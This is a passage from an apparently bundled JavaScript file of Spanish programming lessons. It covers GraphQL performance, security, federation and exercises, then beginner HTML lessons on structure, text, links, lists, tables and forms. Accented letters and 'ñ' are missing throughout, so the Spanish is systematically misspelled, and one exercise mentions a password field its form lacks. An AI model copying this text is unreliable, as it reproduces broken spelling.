**Escenario:** Vas a crear un sistema para una Librera. Cada \`Libro\` tiene un ttulo, un autor y un nmero de pginas. Cada \`Autor\` tiene un nombre y una lista de sus libros.
*Consigna:* Escribe el Schema (DSL) definiendo los tipos \`Book\` y \`Author\` con sus relaciones.

## 3. Evaluacin de Conceptos
*   Qu es el **Over-fetching** y cmo lo soluciona GraphQL?
*   Para qu sirve el objeto \`context\` en un Resolver?
*   Por qu es peligroso no limitar la profundidad de las consultas en un API pblica?

---

### Resultado esperado:
Capacidad para razonar sobre el flujo de datos y la seguridad en entornos de APIs evolutivas. 
`,completed:!1,isProject:!0},{id:"graphql-07-performance-avanzada",title:"Performance Avanzada - El problema N+1 y DataLoaders",level:"senior",content:`# Leccin 07: Performance Avanzada - El problema N+1 y DataLoaders

En el nivel Senior, no basta con que GraphQL funcione; debe ser extremadamente eficiente. El error ms comn que destruye la performance es el problema **N+1**.

## 1. El Problema N+1
Imagina que pides una lista de 10 usuarios y sus ltimos 5 posts.
1.  GraphQL hace **1 consulta** para traer los 10 usuarios.
2.  Luego, por cada usuario, hace **otra consulta** para traer sus posts.
3.  **Resultado:** 1 + 10 = 11 consultas a la base de datos para una sola peticin. Si tienes 100 usuarios, son 101 consultas. Esto mata tu base de datos.

## 2. La Solucin: DataLoaders
**DataLoader** es una librera creada por Facebook que aplica dos tcnicas:
*   **Batching:** Espera un milisegundo a que todos los resolvers pidan sus datos, los junta en una sola lista (batch) y hace **UNA sola consulta** SQL \`WHERE id IN (...)\`.
*   **Caching:** Si dos partes de la query piden el mismo usuario, DataLoader devuelve el resultado de la memoria en lugar de ir a la DB de nuevo.

## 3. Persisted Queries
En lugar de enviar un String gigante con la query por la red, el cliente enva solo un **Hash** (identificador). El servidor ya tiene guardada la query asociada a ese hash. Esto ahorra ancho de banda y mejora la seguridad.

---

### Visin Senior:
"Un API GraphQL sin DataLoaders es una bomba de tiempo para tu base de datos". Dominar el batching es la diferencia entre un prototipo y un sistema de produccin escalable.
`,completed:!1},{id:"graphql-08-seguridad-audit",title:"Seguridad y Auditora Senior",level:"senior",content:`# Leccin 08: Seguridad y Auditora Senior

GraphQL expone muchsima informacin por su naturaleza auto-documentada. Debemos ser quirrgicos al cerrar las puertas a posibles atacantes.

## 1. Deshabilitar la Introspeccin en Produccin
La introspeccin permite que herramientas como Apollo Sandbox lean todo tu Schema.
*   **Junior:** Lo deja prendido.
*   **Senior:** Lo apaga en produccin para que nadie pueda "mapear" los puntos dbiles de tu API sin permiso.

## 2. Query Cost Analysis (Anlisis de Costo)
En lugar de solo limitar la profundidad, asignamos un "costo" a cada campo.
*   Campo \`nombre\`: 1 punto.
*   Campo \`amigos\`: 10 puntos (porque requiere un join complejo).
Si el usuario enva una query que suma ms de 100 puntos, el servidor la rechaza antes de empezar a procesarla.

## 3. Rate Limiting por Operacin
En REST limitamos por IP y URL. En GraphQL, limitamos por la complejidad de la consulta. Puedes usar herramientas como \`graphql-rate-limit\` para definir estas reglas directamente en tu Schema.

---

### Misin Senior:
Manejar la seguridad como una cebolla: capas de validacin de tokens, seguidas de lmites de profundidad, anlisis de costo y finalmente permisos granulares en cada resolver.
`,completed:!1},{id:"graphql-09-apollo-federation",title:"Arquitectura de Supergraphs con Apollo Federation",level:"senior",content:`# Leccin 09: Arquitectura de Supergraphs con Apollo Federation

Qu pasa cuando tu empresa crece tanto que un solo Schema de GraphQL se vuelve inmanejable? Entramos en el mundo de los **Micro-servicios con GraphQL**.

## 1. El concepto de Federation
**Apollo Federation** permite dividir tu Schema en mltiples servicios independientes (Subgraphs), pero que el cliente los vea como un solo API unificado (Supergraph).
*   El **Servicio de Usuarios** maneja los datos bsicos.
*   El **Servicio de Productos** maneja el catlogo.
*   El **Gateway** (o Router) recibe la query, la descompone y le pide a cada microservicio su parte.

## 2. Definicin de Entidades
En Federation, un servicio puede extender un tipo definido en otro servicio.
*   Ejemplo: El servicio de \`Reviews\` puede agregar un campo \`rating\` al tipo \`Product\` que vive en el servicio de \`Inventory\`.

## 3. Beneficios Senior
*   **Independencia de equipos:** El equipo de Pagos puede desplegar sus cambios sin miedo a romper el servicio de Auth.
*   **Escalabilidad:** Cada subgraph puede escalar de forma independiente segn su carga.

---

### Visin Arquitectnica:
"No pases a Federation si tu equipo es de 3 personas. Es una herramienta poderosa para resolver problemas organizativos de grandes empresas; no agregues complejidad si el Monolito an te sirve".
`,completed:!1},{id:"graphql-10-casos-reales-senior",title:"Casos Reales y Trade-offs en Produccin",level:"senior",content:`# Leccin 10: Casos Reales y Trade-offs en Produccin

Los planos son lindos, pero la realidad del trfico masivo es otra. Vamos a analizar cmo las grandes empresas usan GraphQL.

## 1. El caso de GitHub
GitHub expone casi todo su API pblica en GraphQL. 
*   **Decisin:** Obligan a usar paginacin por cursores (no por pginas) para asegurar que las queries sean siempre predecibles.
*   **Trade-off:** Es ms difcil para un desarrollador novato usar el API, pero el servidor es mucho ms estable.

## 2. El caso de Netflix
Netflix usa Federation para unir cientos de microservicios.
*   **Leccin:** Han desarrollado herramientas internas para visualizar cmo fluye la data entre subgraphs para detectar cuellos de botella antes de que afecten al usuario.

## 3. Cundo NO usar GraphQL
No eres un Senior si intentas usar GraphQL para todo:
*   **Transferencia de Archivos:** REST o gRPC son mucho mejores para subir/bajar archivos pesados.
*   **APIs muy simples:** Si tu App solo tiene 3 tablas y 5 pantallas, GraphQL agregar una complejidad innecesaria.

---

### Verdad de la industria:
"Un Senior elige GraphQL no porque sea 'cool', sino porque los beneficios de agilidad en el Frontend superan el costo de mantenimiento en el Backend".
`,completed:!1},{id:"graphql-11-practica-senior-graphql",title:"Arquitecto GraphQL Senior",level:"senior",content:`# Ejercicios y Evaluacin: Arquitecto GraphQL Senior

Demuestra que puedes disear sistemas de escala mundial.

---

## 1. El Desafo del N+1
**Escenario:** Tienes un endpoint de "Dashboard de Administracin" que pide 100 proyectos, y para cada proyecto pide el nombre del dueo y los ltimos 10 logs de actividad.
*Consigna:* Explica cmo usaras **DataLoaders** para que este dashboard pase de hacer 201 consultas a solo 3 consultas.

## 2. El Desafo de la Seguridad (Cost Analysis)
**Escenario:** Un usuario enva esta query:
\`\`\`graphql
query {
  allUsers {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}
\`\`\`
*Consigna:* Si cada nivel de anidacin multiplica el costo por 10, cmo evitaras que esta query congele tu servidor?

## 3. Arquitectura Federation
**Escenario:** Tienes un equipo de "Stock" y un equipo de "Ventas". Ambos necesitan acceder al tipo \`Product\`. 
*Consigna:* Describe cmo dividiras el Schema usando Apollo Federation para que cada equipo sea dueo de su parte del producto sin pisarse.

---

### Recordatorio Final:
En el nivel Senior, el xito se mide en milisegundos de latencia y en la facilidad de otros equipos para integrar sus servicios. 
`,completed:!1,isProject:!0}]},b1={id:"html",title:"HTML5: El Lenguaje de la Web",description:"Aprende a estructurar sitios web modernos, desde la semntica bsica hasta la arquitectura avanzada y accesibilidad.",completed:!1,lessons:[{id:"html-junior-01-intro-html",title:"Leccin 1: Qu es HTML y cmo funciona la web?",level:"junior",content:`# Leccin 1: Qu es HTML y cmo funciona la web?

## 1. Introduccin al Mundo Web

Imagina que quieres construir una casa. Necesitas un plano, ladrillos y una estructura que le d forma. En el mundo de internet, **HTML** es esa estructura.

**HTML** significa *HyperText Markup Language* (Lenguaje de Marcado de Hipertexto). No te asustes por el nombre tcnico. Simplemente es el lenguaje que usamos para decirle al navegador (como Google Chrome, Firefox o Edge) qu contenido debe mostrar en pantalla: qu es un ttulo, qu es un prrafo, qu es una imagen, etc.

HTML **NO** es un lenguaje de programacin (como Python o Java) porque no tiene lgica (no puede "pensar", sumar nmeros o tomar decisiones). Es un **lenguaje de marcado** que *describe* y *estructura* la informacin.

## 2. Cmo funciona la web?

Cuando entras a una pgina web como \`www.ejemplo.com\`, suceden tres pasos principales:

1.  **Tu navegador (el cliente)** enva una peticin a una computadora especial que guarda las pginas web **(el servidor)**.
2.  **El servidor** busca la pgina que pediste y le enva el archivo HTML de vuelta a tu navegador.
3.  **Tu navegador** lee ese cdigo HTML y lo "dibuja" en tu pantalla para que t puedas leerlo y verlo bonito.

Este proceso sucede en milisegundos.

## 3. La analoga del peridico

Piensa en una pgina web como si fuera un peridico:
*   Tiene un ttulo grande al inicio.
*   Tiene subttulos para separar secciones.
*   Tiene prrafos de texto.
*   Tiene imgenes.

HTML es el encargado de decirle al navegador: "Oye, esto de aqu es el ttulo grande", "esto es una foto", "esto es un enlace". Sin HTML, la web sera solo un montn de texto plano sin forma ni sentido.

## 4. Ejemplos Reales: Cdigo vs. Resultado

As se ve el cdigo HTML de un saludo simple:

\`\`\`html
<!-- Esto es un encabezado o ttulo -->
<h1>Hola Mundo!</h1>

<!-- Esto es un prrafo de texto normal -->
<p>Bienvenidos a mi primera pgina web.</p>
\`\`\`

Y el navegador mostrara algo as:

# Hola Mundo!

Bienvenidos a mi primera pgina web.

*(Notars que el "Hola Mundo!" se ve ms grande y en negrita porque es un ttulo)*

---

## 5. Errores Comunes de Principiantes

*   **Creer que HTML es para programar lgica:** Recuerda, HTML solo *estructura*. Para dar estilo (colores, fuentes) usaremos **CSS**, y para la lgica (interactividad) usaremos **JavaScript** ms adelante.
*   **Olvidar cerrar las etiquetas:** Casi todo en HTML tiene un inicio y un fin. Si abres un \`<h1>\` y no lo cierras con \`</h1>\`, todo el texto siguiente se ver gigante!

---

## 6. Tu primer ejercicio prctico

Es hora de probar!

1.  Abre un editor de texto simple (como el "Bloc de notas" en Windows o "TextEdit" en Mac).
2.  Escribe el siguiente texto: \`Hola, soy [Tu Nombre] y estoy aprendiendo HTML.\`
3.  Guarda el archivo con el nombre \`index.html\`. Es muy importante que termine en \`.html\` y no en \`.txt\`!
4.  Busca el archivo que guardaste y haz doble clic. Se abrir en tu navegador.
5.  Felicidades! Has creado tu primera pgina web, aunque sea muy simple.

**Mini-Reto:**
Intenta cambiar el texto del archivo, gurdalo y luego recarga la pgina en tu navegador para ver el cambio.
`,completed:!1},{id:"html-junior-02-estructura-basica",title:"Leccin 2: Estructura bsica de un documento HTML",level:"junior",content:`# Leccin 2: Estructura bsica de un documento HTML

## 1. El esqueleto de una pgina

Al igual que una carta formal tiene partes definidas (fecha, saludo, cuerpo, despedida), un documento HTML tambin tiene una estructura obligatoria. Si no sigues esta estructura, el navegador podra confundirse y mostrar tu pgina mal.

Todo documento HTML debe seguir este patrn estndar:

\`\`\`html
<!DOCTYPE html>
<html>
    <head>
        <!-- Aqu va la informacin tcnica que NO se ve en la pgina -->
        <title>Mi Primera Pgina</title>
    </head>
    
    <body>
        <!-- Aqu va TODO lo que el usuario S ve -->
        <h1>Hola a todos!</h1>
        <p>Este es el cuerpo de mi pgina.</p>
    </body>
</html>
\`\`\`

Vamos a desglosar qu significa cada parte.

## 2. Partes de la estructura

### \`<!DOCTYPE html>\`
Es la primera lnea de cualquier archivo HTML moderno. Le dice al navegador: "Oye, estoy usando **HTML5**, la versin ms moderna y estndar". Sin esto, el navegador podra usar modos antiguos y romper tu diseo.

### \`<html> ... </html>\`
Es la etiqueta raz. Todo tu cdigo (absolutamente todo, excepto el DOCTYPE) debe estar *dentro* de estas dos etiquetas. Es como los muros de la casa.

### \`<head> ... </head>\` (La Cabeza)
Aqu va la informacin para el navegador y los buscadores (como Google). Lo que pones aqu **NO se ve directamente en la pgina web** (a excepcin del ttulo en la pestaa).
*   Configuracin de caracteres (para que se vean las  y tildes).
*   El ttulo de la pestaa del navegador.
*   Enlaces a archivos de estilo (CSS).

### \`<body> ... </body>\` (El Cuerpo)
Aqu va **todo el contenido visible**.
*   Textos
*   Imgenes
*   Videos
*   Botones
Todo lo que el usuario puede ver y tocar va aqu.

## 3. Ejemplo prctico explicado

\`\`\`html
<!DOCTYPE html>
<html lang="es"> <!-- lang="es" indica que la pgina est en Espaol -->
<head>
    <meta charset="UTF-8"> <!-- Importante para ver tildes y  -->
    <title>Mi Blog Personal</title>
</head>
<body>
    <h1>Bienvenido a mi blog</h1>
    <p>Hoy aprenderemos sobre la estructura HTML.</p>
</body>
</html>
\`\`\`

Si guardas este cdigo en un archivo \`.html\` y lo abres:
1.  Vers "Mi Blog Personal" en la pestaa superior del navegador.
2.  Vers el ttulo grande y el prrafo en la pgina blanca.

## 4. Anidacin (Nesting)

En HTML, unas etiquetas van dentro de otras. Esto se llama **anidacin**.
Es como las muecas rusas (Matrioskas).

**Correcto:**
\`\`\`html
<p>Texto con <strong>negrita</strong> bien cerrada</p>
\`\`\`

**Incorrecto (Error de cruce):**
\`\`\`html
<p>Texto con <strong>negrita</p> mal cerrada</strong>
\`\`\`
*El navegador se confundir porque cerraste el prrafo \`<p>\` antes de cerrar la negrita \`<strong>\`.*

## 5. Ejercicio Prctico

Crea un archivo llamado \`estructura.html\` y copia la estructura bsica que aprendimos.
Intenta cumplir estos requisitos:
1.  Que el ttulo de la pestaa diga "Estructura Correcta".
2.  Que en el cuerpo (\`body\`) aparezca tu nombre completo.
3.  Asegrate de incluir \`<meta charset="UTF-8">\` para que puedas usar tildes.
`,completed:!1},{id:"html-junior-03-etiquetas-esenciales",title:"Leccin 3: Etiquetas esenciales (html, head, body)",level:"junior",content:`# Leccin 3: Etiquetas esenciales (html, head, body)

## 1. Profundizando en los bloques principales

En la leccin anterior vimos el esqueleto. Ahora vamos a entender *por qu* son tan importantes estas tres etiquetas: \`<html>\`, \`<head>\` y \`<body>\`. Son los pilares de cualquier sitio web, desde el ms simple hasta Facebook o Google.

## 2. La etiqueta \`<html>\`

Es el elemento raz.
*   **Atributo importante:** \`lang\`.
    Siempre deberas escribir \`<html lang="es">\` si tu pgina es en espaol, o \`<html lang="en">\` si es en ingls.
    *   **Por qu?** Ayuda a los lectores de pantalla (para personas ciegas) a saber cmo pronunciar el texto y a los navegadores a ofrecer traduccin automtica.

## 3. La etiqueta \`<head>\`: El cerebro invisible

El \`head\` contiene metadatos (datos sobre datos). Aunque no lo ves, controla cmo se comporta tu pgina.

Elementos comunes dentro de \`<head>\`:

*   **\`<title>\`**: Define el texto que aparece en la **pestaa** del navegador y en los resultados de Google. Es vital para el SEO (que te encuentren en Google)!
    \`\`\`html
    <title>Recetas de Cocina de la Abuela</title>
    \`\`\`

*   **\`<meta charset="UTF-8">\`**:
    Esta lnea parece rara, pero es **obligatoria** si hablas espaol.
    *   Sin ella: \`Maana habr quis\` se vera \`Maana habr oquis\`.
    *   Con ella: \`Maana habr oquis\` se ve perfecto.
    Le dice al navegador que use el juego de caracteres universal que incluye tildes, , emojis, etc.

*   **\`<meta name="description" content="...">\`**:
    Es el resumen que aparece debajo del enlace azul en Google.
    \`\`\`html
    <meta name="description" content="Aprende a cocinar las mejores recetas caseras paso a paso.">
    \`\`\`

## 4. La etiqueta \`<body>\`: El escenario visible

El \`body\` es donde ocurre la magia visual. **Solo puede haber UN** \`<body>\` por pgina.

Errores comunes en el \`body\`:
*   Poner el \`<body>\` dentro del \`<head>\` (Jams!).
*   Tener dos etiquetas \`<body>\`.
*   Escribir contenido visible (como un ttulo \`<h1>\`) fuera del \`body\`. Aunque a veces el navegador lo corrige, es una mala prctica tcnica.

## 5. El Modelo de Caja (Introduccin visual)

Imagina que estas etiquetas son cajas contenedoras:

1.  La caja \`<html>\` es la caja de mudanza gigante que envuelve todo.
2.  Dentro, hay dos cajas separadas que NO se tocan:
    *   Caja \`<head>\`: Llena de manuales e instrucciones y configuraciones.
    *   Caja \`<body>\`: Llena de muebles, cuadros y decoracin.

## 6. Ejercicio: "El Detective de Cdigo"

Copia el siguiente cdigo en un archivo y **encuentra los 3 errores** que he puesto a propsito. Luego corrgelos para que funcionen bien.

**Cdigo con errores:**

\`\`\`html
<!DOCTYPE html>
<html>
    <head>
        <title>Pgina con errores</title>
        <h1>Hola, soy un ttulo perdido</h1> <!-- ERROR 1 -->
    </head>
    
    <body>
        <p>Este prrafo est bien.</p>
    </body>
    
    <p>Este prrafo est fuera de lugar.</p> <!-- ERROR 2 -->
    
    <body> <!-- ERROR 3 -->
        <p>Otro cuerpo???</p>
    </body>
</html>
\`\`\`

**Pistas:**
1.  Los ttulos visibles pueden ir en el \`head\`?
2.  Puede haber contenido fuera de \`html\` o despus de cerrar \`body\`?
3.  Cuntos \`body\` puede tener un documento?
`,completed:!1},{id:"html-junior-04-textos",title:"Leccin 4: Ttulos, prrafos y texto",level:"junior",content:`# Leccin 4: Ttulos, prrafos y texto

## 1. La Jerarqua de los Ttulos (Headings)

En HTML, los ttulos no solo sirven para hacer el texto grande. Sirven para dar **estructura lgica** y jerarqua a tu contenido. Es como un ndice de un libro.

Existen 6 niveles de ttulos: \`<h1>\` hasta \`<h6>\`.

*   **\`<h1>\`**: El ttulo principal de la pgina. **Solo debe haber UNO por pgina**. Es lo ms importante para Google.
*   **\`<h2>\`**: Ttulos de secciones principales.
*   **\`<h3>\`**: Subttulos dentro de las secciones.
*   ... y as hasta el \`<h6>\`.

**Ejemplo visual:**

\`\`\`html
<h1>Los Planetas</h1> (Ttulo principal)
    <h2>Planetas Interiores</h2> (Seccin 1)
        <h3>Tierra</h3> (Sub-seccin)
        <h3>Marte</h3> (Sub-seccin)
    <h2>Planetas Exteriores</h2> (Seccin 2)
        <h3>Jpiter</h3> (Sub-seccin)
\`\`\`

**Error comn:** No uses un \`<h2>\` solo porque quieres que el texto se vea mediano. Usa la etiqueta correcta segn la importancia del texto, y luego cambia el tamao con CSS (estilos).

## 2. Prrafos \`<p>\`

Para escribir texto normal, usamos la etiqueta \`<p>\` (paragraph).

\`\`\`html
<p>Este es un prrafo de texto normal. HTML ignorar      los espacios    extra   que pongas.</p>
\`\`\`

**Dato clave:** Si en tu cdigo das muchos "Enter" (saltos de lnea), HTML los ignorar y mostrar todo seguido.
Para forzar un salto de lnea dentro de un prrafo, usa la etiqueta \`<br>\` (break), aunque no se abusa de ella.

\`\`\`html
<p>
    Lnea uno.<br>
    Lnea dos.
</p>
\`\`\`

## 3. Formato de Texto: Negritas y Cursivas

Para enfatizar partes del texto, usamos estas etiquetas:

*   **Negrita (Importante):** \`<strong>\`
    *   Uso: \`<strong>Texto muy importante</strong>\`
    *   Tambin existe \`<b>\`, pero \`<strong>\` le dice a Google que eso *es* importante, no solo visualmente "negrito".
    
*   *Cursiva (nfasis):* \`<em>\`
    *   Uso: \`<em>Texto con nfasis</em>\`
    *   Tambin existe \`<i>\`, pero \`<em>\` (emphasis) es semnticamente mejor.

**Ejemplo combinado:**

\`\`\`html
<p>
    Bienvenido! Es <strong>muy importante</strong> que leas las instrucciones.
    <em>(Por favor, no te saltes este paso)</em>.
</p>
\`\`\`

## 4. Comentarios en el cdigo

A veces quieres dejar notas para ti mismo que **el usuario no vea**.

\`\`\`html
<!-- Este es un comentario secreto que solo se ve en el cdigo -->
<p>Este texto s se ve.</p>
\`\`\`

## 5. Ejercicio Prctico "Tu Biografa"

Crea una pgina \`biografia.html\` que tenga:
1.  Un \`<h1>\` con tu nombre.
2.  Un \`<h2>\` que diga "Sobre m".
3.  Un prrafo \`<p>\` describindote. Usa **negritas** para resaltar tus cualidades.
4.  Un \`<h2>\` que diga "Mis Hobbies".
5.  Un prrafo explicando qu te gusta hacer, usando *cursivas* para los nombres de tus actividades.
`,completed:!1},{id:"html-junior-05-enlaces-imagenes",title:"Leccin 5: Enlaces e imgenes",level:"junior",content:`# Leccin 5: Enlaces e imgenes

## 1. Enlaces: La "Web" en World Wide Web

Los enlaces (links) son lo que hacen que la web sea una "red". Nos permiten saltar de una pgina a otra.
La etiqueta para los enlaces es \`<a>\` (de *anchor* o ancla).

### Estructura de un enlace

\`\`\`html
<a href="https://www.google.com">Ir a Google</a>
\`\`\`

*   **\`<a>\`**: La etiqueta de apertura.
*   **\`href="..."\`**: Es el atributo ms importante (Hypertext REFerence). Aqu pones la direccin (URL) a donde quieres ir.
*   **"Ir a Google"**: Es el texto "clicable" que ve el usuario.
*   **\`</a>\`**: La etiqueta de cierre.

### Tipos de enlaces

1.  **Enlaces externos:** Van a otro sitio web.
    \`\`\`html
    <a href="https://www.youtube.com" target="_blank">Ver videos</a>
    \`\`\`
    *Truco:* El atributo \`target="_blank"\` hace que el enlace se abra en una **pestaa nueva**, muy til para no sacar al usuario de tu pgina.

2.  **Enlaces internos:** Van a otra pgina de tu mismo sitio.
    \`\`\`html
    <a href="contacto.html">Contctame</a>
    \`\`\`

## 2. Imgenes: Dando vida al sitio

La etiqueta para imgenes es \`<img>\`.
OJO! Esta es una etiqueta especial: **no tiene etiqueta de cierre**. Se cierra sola.

### Estructura de una imagen

\`\`\`html
<img src="foto-gatito.jpg" alt="Un gatito adorable durmiendo">
\`\`\`

*   **\`src="..."\`**: (Source o Fuente). Es la ruta al archivo de la imagen. Puede ser un archivo en tu carpeta o una URL de internet.
*   **\`alt="..."\`**: (Alternative Text). **Importantsimo!**
    1.  Si la imagen no carga (error de internet), se mostrar este texto.
    2.  Es lo que leen las personas ciegas que usan lectores de pantalla.
    3.  Ayuda a Google a entender qu hay en la foto.

### Cambiando el tamao

Puedes controlar el tamao con \`width\` (ancho) y \`height\` (alto). Es mejor usar solo uno para que la imagen no se deforme.

\`\`\`html
<!-- Ancho de 300 pixeles, el alto se ajusta automtico -->
<img src="logo.png" alt="Logo de la empresa" width="300">
\`\`\`

## 3. Combinando Enlaces e Imgenes

Quieres que una imagen sea clicable? Pon la imagen DENTRO de la etiqueta \`<a>\`!

\`\`\`html
<a href="https://www.instagram.com">
    <img src="icono-instagram.png" alt="Ir a mi Instagram" width="50">
</a>
\`\`\`

## 4. Ejercicio Prctico "Galera de Favoritos"

1.  Busca en Google 3 imgenes de cosas que te gusten (comida, lugares, juegos).
2.  Copia la "Direccin de la imagen" (Click derecho -> Copiar direccin de imagen).
3.  Crea un archivo \`galeria.html\`.
4.  Crea un ttulo \`<h1>\` que diga "Mis cosas favoritas".
5.  Pon las 3 imgenes usando la etiqueta \`<img>\`. No olvides el \`alt\` .
6.  Haz que al hacer clic en una de ellas, te lleve a una pgina web relacionada (por ejemplo, a Wikipedia).
`,completed:!1},{id:"html-junior-06-listas",title:"Leccin 6: Listas (ul, ol, li)",level:"junior",content:`# Leccin 6: Listas (ul, ol, li)

## 1. Organizando la informacin

A nadie le gusta leer bloques de texto gigantes. Las listas son perfectas para organizar tems de forma clara y fcil de leer.

En HTML hay dos tipos principales de listas:
1.  **Listas Desordenadas** (Con puntitos o *bullets*).
2.  **Listas Ordenadas** (Con nmeros 1, 2, 3...).

## 2. Listas Desordenadas \`<ul>\`
Se usan cuando el orden de los elementos no importa (como una lista de compras).
*   \`<ul>\` significa *Unordered List*.
*   \`<li>\` significa *List Item* (cada elemento de la lista).

\`\`\`html
<h3>Lista de Compras</h3>
<ul>
    <li>Leche</li>
    <li>Huevos</li>
    <li>Pan</li>
</ul>
\`\`\`
**Resultado:**
* Leche
* Huevos
* Pan

## 3. Listas Ordenadas \`<ol>\`
Se usan cuando el orden S importa (como una receta o un ranking).
*   \`<ol>\` significa *Ordered List*.
*   Tambin usa \`<li>\` para los elementos.

\`\`\`html
<h3>Pasos para hacer caf</h3>
<ol>
    <li>Hervir el agua.</li>
    <li>Poner caf en la taza.</li>
    <li>Servir el agua caliente.</li>
</ol>
\`\`\`
**Resultado:**
1. Hervir el agua.
2. Poner caf en la taza.
3. Servir el agua caliente.

## 4. Listas Anidadas (Listas dentro de listas)

Puedes meter una lista dentro de otra. Es muy comn en mens de navegacin o ndices.

\`\`\`html
<ul>
    <li>Frutas
        <ul>
            <li>Manzana</li>
            <li>Banana</li>
        </ul>
    </li>
    <li>Verduras
        <ul>
            <li>Lechuga</li>
            <li>Zanahoria</li>
        </ul>
    </li>
</ul>
\`\`\`

**Resultado visual:**
* Frutas
    * Manzana
    * Banana
* Verduras
    * Lechuga
    * Zanahoria

## 5. Ejercicio Prctico "Tu Top 3"

Crea un archivo \`listas.html\` y haz lo siguiente:

1.  Usa una **lista ordenada** (\`<ol>\`) para escribir tu Top 3 de pelculas o series favoritas.
2.  Usa una **lista desordenada** (\`<ul>\`) para listar 3 ingredientes que necesitas para cocinar tu comida favorita.
3.  **Reto:** Intenta anidar una lista. Por ejemplo, dentro de una pelcula, pon una lista desordenada con los nombres de 2 actores de esa pelcula.
`,completed:!1},{id:"html-junior-07-tablas",title:"Leccin 7: Tablas",level:"junior",content:`# Leccin 7: Tablas

## 1. Cundo usar tablas?

Antiguamente, las tablas se usaban para disear toda la pgina web (un horror!). Hoy en da, **solo** debemos usar tablas mostrar **datos tabulares**.
Ejemplos correctos:
*   Un horario de clases.
*   Una lista de precios.
*   Una tabla de posiciones de ftbol.

## 2. Estructura de una Tabla

Las tablas en HTML se construyen fila por fila (horizontalmente). Es un poco como armar un rompecabezas.

Las etiquetas clave son:
*   \`<table>\`: Envuelve toda la tabla.
*   \`<tr>\`: *Table Row* (Fila de la tabla). Crea una lnea horizontal.
*   \`<th>\`: *Table Header* (Encabezado de tabla). La celda del ttulo (negrita y centrada por defecto).
*   \`<td>\`: *Table Data* (Dato de tabla). La celda normal con informacin.

## 3. Ejemplo paso a paso

Vamos a crear una tabla de alumnos y notas.

\`\`\`html
<table border="1"> <!-- border="1" es para ver las lneas temporalmente -->
    
    <!-- Primera fila: Los encabezados -->
    <tr>
        <th>Nombre</th>
        <th>Edad</th>
        <th>Nota</th>
    </tr>

    <!-- Segunda fila: Datos del primer alumno -->
    <tr>
        <td>Juan</td>
        <td>15</td>
        <td>Aprobado</td>
    </tr>

    <!-- Tercera fila: Datos del segundo alumno -->
    <tr>
        <td>Mara</td>
        <td>16</td>
        <td>Sobresaliente</td>
    </tr>

</table>
\`\`\`

## 4. Organizando mejor: La Semntica

Para tablas profesionales, podemos agrupar las filas en tres secciones, igual que un documento HTML:
1.  \`<thead>\`: La cabecera (donde van los ttulos).
2.  \`<tbody>\`: El cuerpo (donde van los datos).
3.  \`<tfoot>\`: El pie de tabla (donde van totales o resmenes).

\`\`\`html
<table>
    <thead>
        <tr>
            <th>Producto</th>
            <th>Precio</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Manzanas</td>
            <td>$100</td>
        </tr>
        <tr>
            <td>Peras</td>
            <td>$120</td>
        </tr>
    </tbody>
    <tfoot>
        <tr>
            <td>Total</td>
            <td>$220</td>
        </tr>
    </tfoot>
</table>
\`\`\`
*Esto ayuda a los navegadores y a la accesibilidad a entender mejor tu tabla.*

## 5. Ejercicio Prctico "El Horario"

Crea un archivo \`horario.html\`.
Disea una tabla simple que represente tu semana (Lunes a Viernes).
*   La primera fila (\`<th>\`) debe tener los das de la semana.
*   Crea al menos 2 filas ms (\`<tr>\`) con actividades que hagas esos das (ej: "Estudiar", "Gimnasio", "Trabajar").
*   No olvides poner \`border="1"\` en la etiqueta table para poder ver las celdas! (Ms adelante aprenderemos a hacer bordes bonitos con CSS).
`,completed:!1},{id:"html-junior-08-formularios",title:"Leccin 8: Formularios bsicos",level:"junior",content:`# Leccin 8: Formularios bsicos

## 1. Interactuando con el usuario

Hasta ahora, nuestras pginas solo muestran informacin. Pero, y si queremos que el usuario nos enve informacin? Para eso existen los **Formularios**.
Son esenciales para: Iniciar sesin, registrarse, buscar en Google, comprar online, etc.

La etiqueta padre es \`<form>\`.

\`\`\`html
<form action="/enviar-datos" method="POST">
    <!-- Aqu van los campos para escribir -->
</form>
\`\`\`

*   \`action\`: A dnde se envan los datos cuando terminas (una URL).
*   \`method\`: Cmo se envan (generalmente "GET" para buscar o "POST" para guardar datos privados).

## 2. La etiqueta Input (Entrada)

La etiqueta reina de los formularios es \`<input>\`. Es camalenica: cambia de forma segn su atributo \`type\`.
Como \`<img>\`, **no tiene etiqueta de cierre**.

\`\`\`html
<!-- Caja de texto simple para nombres -->
<label>Nombre:</label>
<input type="text" placeholder="Escribe tu nombre aqu">
\`\`\`

## 3. Labels (Etiquetas)

Es una buena prctica SIEMPRE acompaar un input con un \`<label>\`. El label le dice al usuario qu debe escribir ah.

Forma pro de conectarlos:
Usar \`id\` en el input y \`for\` en el label. Esto hace que si haces clic en el texto "Nombre:", el cursor se activa en la cajita. Magia de usabilidad!

\`\`\`html
<label for="email-usuario">Correo Electrnico:</label>
<input type="email" id="email-usuario" name="email">
\`\`\`

## 4. Tipos bsicos de Input

Aunque profundizaremos en la prxima leccin, estos son los esenciales:

*   \`type="text"\`: Texto normal (Nombre, Ciudad).
*   \`type="password"\`: Contrasea (aparecen puntitos ****).
*   \`type="email"\`: Valida que tenga un @.
*   \`type="number"\`: Solo permite nmeros.

## 5. Ejemplo de Formulario de Login Simple

\`\`\`html
<form>
    <h2>Iniciar Sesin</h2>
    
    <div>
        <label for="user">Usuario:</label>
        <input type="text" id="user" name="usuario">
    </div>
    
    <br>

    <div>
        <label for="pass">Contrasea:</label>
        <input type="password" id="pass" name="contrasea">
    </div>

    <br>

    <button type="submit">Entrar</button>
</form>
\`\`\`

## 6. Ejercicio "Formulario de Contacto"

Crea un archivo \`contacto.html\`.
Haz un formulario bsico que pida:
1.  Nombre (texto).
2.  Edad (nmero).
3.  Correo electrnico (email).
4.  Un botn para enviar.

Usa etiquetas \`<label>\` para cada campo. Asegrate de que el campo de contrasea oculte lo que escribes!
